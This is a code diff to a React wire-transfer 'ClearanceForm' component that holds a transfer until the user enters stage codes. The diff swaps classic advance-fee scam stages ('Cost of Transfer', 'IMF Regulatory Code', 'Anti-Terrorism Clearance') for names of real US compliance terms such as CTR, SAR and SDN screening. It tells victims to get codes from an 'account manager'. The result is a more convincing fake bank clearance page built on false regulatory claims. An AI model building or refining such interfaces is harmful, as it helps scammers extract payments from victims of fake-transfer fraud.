@@ -69,10 +69,10 @@ export default function ClearanceForm({ wire }: { wire: any }) {
 
     const getStageInfo = (stage: string) => {
         switch (stage) {
-            case 'TAA': return { label: 'Tax Authentication Code (TAA)', desc: 'Required by International Tax Authority for large transfers.' };
-            case 'COT': return { label: 'Cost of Transfer (COT)', desc: 'Regional banking compliance code required for destination release.' };
-            case 'IMF': return { label: 'IMF Regulatory Code (IMF)', desc: 'Final verification step.' };
-            case 'IJY': return { label: 'Anti-Terrorism Clearance (IJY)', desc: 'Final IMF Verification required for cross-border settlement.' };
+            case 'CTR': return { label: 'Currency Transaction Report Code (CTR)', desc: 'Required by federal regulation (BSA/FinCEN) for large-value transfers.' };
+            case 'SAR': return { label: 'Suspicious Activity Report Code (SAR)', desc: 'Compliance review code required before funds can proceed.' };
+            case 'SDN': return { label: 'Specially Designated Nationals Screening Code (SDN)', desc: 'Required sanctions-list screening for cross-border transfers.' };
+            case 'CFT': return { label: 'Combating the Financing of Terrorism Code (CFT)', desc: 'Final compliance clearance required before cross-border settlement.' };
             default: return { label: 'Clearance Code', desc: 'Please enter the code provided by your account manager.' };
         }
     };
